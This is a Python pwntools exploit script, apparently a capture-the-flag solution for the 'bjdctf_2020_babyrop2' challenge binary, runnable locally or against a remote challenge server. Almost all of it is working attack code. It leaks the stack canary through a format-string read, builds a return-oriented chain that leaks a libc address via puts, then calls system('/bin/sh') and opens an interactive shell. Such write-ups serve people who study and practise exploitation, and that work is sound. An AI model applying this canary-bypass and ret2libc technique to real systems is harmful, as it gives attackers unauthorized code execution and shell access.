import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bjdctf_2020_babyrop2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bjdctf_2020_babyrop2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29907)
			elf=ELF('./bjdctf_2020_babyrop2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		pop_rdi=0x0000000000400993
		io.recv()
		io.sendline('%7$p')
		can=int(io.recv(18),16)
		io.recv()
		pay='a'*0x18+p64(can)+'a'*0x8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4006ad)
		io.sendline(pay)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		io.recv()
		io.sendline('%7$p')
		pay='a'*0x18+p64(can)+'a'*0x8+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(0x4006ad)
		io.recv()
		io.sendline(pay)





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue